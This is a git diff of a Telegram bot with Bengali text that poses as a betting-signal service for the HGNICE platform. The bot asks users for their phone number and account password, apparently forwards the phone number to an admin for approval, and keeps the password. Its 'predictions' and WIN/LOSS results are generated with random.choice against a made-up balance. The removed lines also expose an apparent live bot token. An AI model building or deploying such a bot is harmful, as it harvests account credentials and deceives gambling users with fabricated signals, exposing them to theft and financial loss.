@@ -18,8 +18,7 @@ logging.basicConfig(
     level=logging.INFO
 )
 
-# Railway-র Variables থেকে টোকেন নেওয়া
-BOT_TOKEN = os.environ.get("8822744038:AAGTRCgTmm0onsd7mJR13fxWtf79LuC7X4M")
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_ID = 8164888241
 
 user_states = {}
@@ -31,7 +30,7 @@ def get_state(uid):
             "awaiting": None,
             "phone": "",
             "password": "",
-            "balance": 1000.0,  # টেস্টের জন্য ডিফল্ট ব্যালেন্স
+            "balance": 1000.0,
             "game": None,
             "total_steps": 0,
             "steps": [],
@@ -50,16 +49,12 @@ async def auto_bet_loop(uid, ctx):
     state = get_state(uid)
     try:
         while state["running"]:
-            await asyncio.sleep(30)  # প্রতি ৩০ সেকেন্ড পর পর সিগন্যাল
-            if not state["running"]:
-                break
-            
-            if not state["steps"]:
+            await asyncio.sleep(30)
+            if not state["running"] or not state["steps"]:
                 break
             
             current_step = state["steps"][state["step_idx"] % len(state["steps"])]
             
-            # ব্যালেন্স চেক: পর্যাপ্ত ব্যালেন্স না থাকলে বন্ধ করা
             if state["balance"] < current_step:
                 state["running"] = False
                 await ctx.bot.send_message(
@@ -73,8 +68,6 @@ async def auto_bet_loop(uid, ctx):
 
             p = gen_period(state["game"])
             prediction = random.choice(["BIG / GREEN", "SMALL / RED"])
-            
-            # উইন নাকি লস নির্ধারণ
             is_win = random.choice([True, False])
             result_status = "WIN (+)" if is_win else "LOSS (-)"
             
@@ -101,11 +94,11 @@ async def auto_bet_loop(uid, ctx):
                 await ctx.bot.send_message(chat_id=uid, text=msg)
             except Exception as e:
                 print(f"Loop message error: {e}")
-                
     except asyncio.CancelledError:
         pass
 
 async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    print("Received /start command!")  # রেলওয়ে লগে চেক করার জন্য
     uid = update.effective_user.id
     state = get_state(uid)
     
@@ -144,7 +137,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     state = get_state(uid)
     text = update.message.text.strip()
 
-    # ১. ফোন নম্বর নেওয়া
     if not state["logged_in"] and state.get("awaiting") == "phone":
         state["phone"] = text
         state["awaiting"] = "pending_approval"
@@ -174,7 +166,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             print(f"Admin message error: {e}")
         return
 
-    # ২. পাসওয়ার্ড নেওয়া
     if not state["logged_in"] and state.get("awaiting") == "password":
         state["password"] = text
         state["logged_in"] = True
@@ -187,7 +178,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             return
 
         await update.message.reply_text(
-            f"পাসওয়ার্ড সফলভাবে গ্রহণ করা হয়েছে!\nએકાউন্ট ব্যালেন্স: {state['balance']}"
+            f"পাসওয়ার্ড সফলভাবে গ্রহণ করা হয়েছে!\nঅ্যাকাউন্ট ব্যালেন্স: {state['balance']}"
         )
 
         keyboard = [
@@ -202,7 +193,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ৩. মোট কয়টি স্টেপ হবে তা নির্ধারণ
     if state["logged_in"]:
         if state.get("awaiting") == "total_steps":
             try:
@@ -213,13 +203,12 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 state["steps"] = []
                 state["awaiting"] = "collecting_steps"
                 await update.message.reply_text(
-                    f"মোট {total} টি স্টেপ নির্ধারণ করা হয়েছে。\n\nস্টেপ ১ (Step 1) এর মান লিখুন:"
+                    f"মোট {total} টি স্টেপ নির্ধারণ করা হয়েছে।\n\nস্টেপ ১ (Step 1) এর মান লিখুন:"
                 )
             except:
                 await update.message.reply_text("সঠিক সংখ্যা লিখুন। যেমন: 5")
             return
 
-        # ৪. সিরিয়াল অনুযায়ী স্টেপ ইনপুট নেওয়া
         if state.get("awaiting") == "collecting_steps":
             try:
                 val = float(text)
@@ -241,7 +230,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("সঠিক সংখ্যা লিখুন।")
             return
 
-        # ৫. টার্গেট প্রফিট সেট করা এবং অটো-বেটিং শুরু করা
         if state.get("awaiting") == "target":
             try:
                 tgt = float(text)
@@ -256,7 +244,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 if state.get("task"):
                     state["task"].cancel()
                 state["task"] = asyncio.create_task(auto_bet_loop(uid, ctx))
-            except Exception as e:
+            except:
                 await update.message.reply_text("সঠিক সংখ্যা লিখুন। যেমন: 500")
             return
 
@@ -269,8 +257,7 @@ async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     if data == "start_login":
         state["awaiting"] = "phone"
-        login_text = "আপনার HGNICE ফোন নম্বরটি লিখুন:"
-        await query.message.reply_text(login_text)
+        await query.message.reply_text("আপনার HGNICE ফোন নম্বরটি লিখুন:")
 
     elif data.startswith("approve_"):
         target_uid = int(data.split("_")[1])
@@ -304,7 +291,7 @@ async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 def main():
     if not BOT_TOKEN:
-        print("BOT_TOKEN missing!")
+        print("BOT_TOKEN is missing!")
         return
 
     app = ApplicationBuilder().token(BOT_TOKEN).build()
@@ -313,7 +300,7 @@ def main():
     app.add_handler(CallbackQueryHandler(callback_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
-    print("Bot is running...")
+    print("Bot is starting polling...")
     app.run_polling()
 
 if __name__ == "__main__":
